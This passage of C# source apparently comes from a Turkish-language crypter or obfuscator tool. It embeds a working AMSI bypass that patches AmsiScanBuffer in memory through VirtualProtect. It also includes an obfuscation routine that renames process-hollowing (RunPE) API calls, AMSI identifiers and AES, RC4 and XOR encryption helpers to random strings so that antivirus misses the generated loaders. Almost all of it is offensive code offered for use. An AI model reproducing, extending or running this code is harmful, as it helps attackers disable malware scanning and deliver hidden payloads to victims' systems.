        public static IntPtr GetModuleBaseAddress(string moduleName)
        {
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return moduleHandle == IntPtr.Zero ? IntPtr.Zero : moduleHandle;
        }

        public static IntPtr GetExportAddress(string moduleName, string procName)
        {
            IntPtr moduleHandle = LoadLibrary(moduleName);
            if (moduleHandle == IntPtr.Zero)
                return IntPtr.Zero;

            IntPtr procAddress = GetProcAddress(moduleHandle, procName);
            return procAddress == IntPtr.Zero ? IntPtr.Zero : procAddress;
        }
    }

    internal static class AMSI
    {
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate IntPtr LoadLibrary(byte[] name);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static LoadLibrary loadLibrary;
        static VirtualProtect virtualProtect;

        static void PrepareDelegate()
        {
            IntPtr loadLib = AmsiResolver.GetExportAddress(""kernel32.dll"", ""LoadLibraryW"");
            IntPtr virtualProt = AmsiResolver.GetExportAddress(""kernel32.dll"", ""VirtualProtect"");

            loadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(loadLib, typeof(LoadLibrary));
            virtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(virtualProt, typeof(VirtualProtect));
        }

        static IntPtr LoadAmsiLibrary()
        {
            string encryptedLibrary = ""YW1zaS5kbGw="";
            byte[] libraryBytes = Convert.FromBase64String(encryptedLibrary);
            string decryptedLibrary = Encoding.Unicode.GetString(libraryBytes);

            return loadLibrary(Encoding.Unicode.GetBytes(decryptedLibrary));
        }

        internal static bool BaypasAmsi()
        {
            IntPtr amsiDll = AmsiResolver.GetModuleBaseAddress(""amsi.dll"");
            if (amsiDll == IntPtr.Zero)
                return false;

            IntPtr amsiScanBufferLocation = AmsiResolver.GetExportAddress(""amsi.dll"", ""AmsiScanBuffer"");

            byte[] patchBytes = IntPtr.Size == 8 ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

            bool SQL = virtualProtect(amsiScanBufferLocation, (UIntPtr)patchBytes.Length, 0x40, out uint oldProtect);
            if (!SQL)
                return false;

            Marshal.Copy(patchBytes, 0, amsiScanBufferLocation, patchBytes.Length);

            SQL = virtualProtect(amsiScanBufferLocation, (UIntPtr)patchBytes.Length, oldProtect, out uint _);
            if (!SQL)
                return false;

            return true;
        }
    }
}
";
        }

        private string ObfuscateCode(string code, string runPEType)
        {
            Random random = new Random();

            // Rastgele isimler üretmek için
            string GenerateRandomName(int length)
            {
                const string chars = "计机私欢能个欢望习域够希并且算习这望做م并能且且并喜域学能贡域计望计贡献领私望算习这学欢出够希做计域这望计希我习这个望个欢我献这计算我贡能习能出机算私算做喜欢这个我我够希且域贡个学域能这出为希我出算我做域我贡献领为学算我领出习并望并领算学科领献我够喜能算私我ا我算科献欢学领能并这我领计能望习够希这希献贡领并为望机机个贡喜学个领算欢喜能私欢够机望我私望计计并算ε能私机机够且算做我习贡领出私这望私域习我能出为希学喜望这献域欢学域我做欢做计学出喜能且并望算贡出望希计希学欢我够能域学希学个领私我我科域望域算能私域域做做算希习并且这为学学我我并欢计能计且域域这望能能出这出算习能个能望域习做这能领计μ私个学且希够出出够能贡算我科个贡够习为够学द且能个这领且我欢私喜望学贡个习能能机计这我欢学习够望为为能域喜望喜这计喜做计我望科域出望出域私";
                return new string(Enumerable.Range(0, length)
                                           .Select(_ => chars[random.Next(chars.Length)])
                                           .ToArray());
            }

            string obfuscatedCode = code;


            if (runPEType == "Type 1")
            {
                obfuscatedCode = obfuscatedCode.Replace("CreateProcess", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("VirtualAllocEx", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("NtUnmapViewOfSection", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("CMemoryExecute", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("NtWriteVirtualMemory", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("NtGetContextThread", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("NtSetContextThread", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("NtResumeThread", GenerateRandomName(999));

            }

            else if (runPEType == "AMSI Bypass 2")
            {
                obfuscatedCode = obfuscatedCode.Replace("InlineAssignHelper", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("GetProcessSecurityDescriptor", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("GetKernelObjectSecurity", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("Protect", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("SetProcessSecurityDescriptor", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("amsiScanBufferAddr", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("amsiHandle", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("GetModuleHandle", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("AmsiScanBuffer", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("GetProcAddress", GenerateRandomName(999));
            }

            else if (runPEType == "Type 3")
            {
                obfuscatedCode = obfuscatedCode.Replace("CreateProcess", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("GetThreadContext", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("Wow64GetThreadContext", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("SetThreadContext", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("Wow64SetThreadContext", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("ReadProcessMemory", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("WriteProcessMemory", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("NtUnmapViewOfSection", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("VirtualAllocEx", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("ResumeThread", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("HandleRun", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("sizeOfImage", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("sizeOfHeaders", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("allowOverride", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("newImageBase", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("addressOfEntryPoint", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("newImageBase", GenerateRandomName(999));


            }
            else if (runPEType == "Type 2")
            {
                obfuscatedCode = obfuscatedCode.Replace("CreateProcess", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("GetThreadContext", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("Wow64GetThreadContext", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("SetThreadContext", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("Wow64SetThreadContext", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("ReadProcessMemory", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("WriteProcessMemory", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("NtUnmapViewOfSection", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("VirtualAllocEx", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("ResumeThread", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("HandleRun", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("sizeOfImage", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("sizeOfHeaders", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("allowOverride", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("newImageBase", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("addressOfEntryPoint", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("newImageBase", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("GetProcessSecurityDescriptor", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("InlineAssignHelper", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("GetKernelObjectSecurity", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("target", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("SetProcessSecurityDescriptor", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("SetKernelObjectSecurity", GenerateRandomName(999));


            }
            else if (runPEType == "Type 4")
            {
                obfuscatedCode = obfuscatedCode.Replace("moduleHandle", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("procAddress", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("loadLib", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("virtualProt", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("libraryBytes", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("decryptedLibrary", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("amsiDll", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("amsiScanBufferLocation", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("patchBytes", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("oldProtect", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("_", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("GetModuleHandle", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("GetProcAddress", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("LoadLibrary", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("SQL", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("encryptedLibrary", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("LoadAmsiLibrary", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("PrepareDelegate", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("GetExportAddress", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("GetModuleBaseAddress", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("BaypasAmsi", GenerateRandomName(999));


            }
            else if (runPEType == "AES Şifreleme")
            {
                obfuscatedCode = obfuscatedCode.Replace("AESEncrypt", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("ms", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("cs", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("sw", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("aesAlg", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("encryptor", GenerateRandomName(999));
            }
            else if (runPEType == "RC4 Şifreleme")
            {
                obfuscatedCode = obfuscatedCode.Replace("Swap", GenerateRandomName(999)); 
                obfuscatedCode = obfuscatedCode.Replace("RC4", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("num", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("array2", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("array", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("RC4_sifreleme", GenerateRandomName(999));

            }
            else if (runPEType == "x0r Şifreleme")
            {
                obfuscatedCode = obfuscatedCode.Replace("Xor_sifreleme", GenerateRandomName(999));
                obfuscatedCode = obfuscatedCode.Replace("result", GenerateRandomName(999));
            }
            return obfuscatedCode;
        }





        private void SaveButton_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Filter = "C# Files (*.cs)|*.cs|All Files (*.*)|*.*",
                DefaultExt = "cs"
            };

            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                string filePath = saveFileDialog.FileName;
                File.WriteAllText(filePath, OutputTextBox.Text);
            }
        }


        private void ClearButton_Click(object sender, EventArgs e)
        {
            OutputTextBox.Clear();
        }
        private void CopyButton_Click(object sender, EventArgs e)
        {
            {

                if (!string.IsNullOrEmpty(OutputTextBox.Text))
                {
                    Clipboard.SetText(OutputTextBox.Text);
                    MessageBox.Show("Metin panoya kopyalandı. |$| Telegram = KageSoftware", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    MessageBox.Show("Kopyalanacak metin bulunamadı.", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);

                }

            }
        }
    }
}
